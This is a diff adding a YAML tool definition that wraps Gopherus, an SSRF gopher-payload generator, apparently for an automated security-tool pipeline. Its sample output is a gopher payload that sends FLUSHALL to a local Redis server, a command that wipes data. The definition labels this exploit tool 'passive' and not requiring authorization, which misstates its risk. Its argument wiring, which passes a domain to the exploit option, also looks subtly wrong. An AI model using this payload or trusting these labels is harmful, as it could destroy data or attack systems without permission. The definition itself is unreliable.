@@ -1,0 +1,34 @@
+id: gopherus
+name: Gopherus
+category: vulnerability
+description: tarunkant Gopherus crafts gopher payloads to exploit SSRF against backend services.
+binary: gopherus
+risk: passive
+requires_authorization: false
+inputs:
+- name: target
+  type: domain
+  required: true
+outputs:
+- name: payload
+  type: text
+command:
+  argv:
+  - gopherus
+  - --exploit
+  - '{{target}}'
+parser:
+  type: line_based
+  entity: finding
+default_timeout_seconds: 600
+max_retries: 1
+retry_backoff_seconds: 1.0
+continue_on_error: false
+tags:
+- ssrf
+- payload-generation
+install:
+  method: manual
+  package: tarunkant/Gopherus
+dry_run_output:
+- 'gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A'
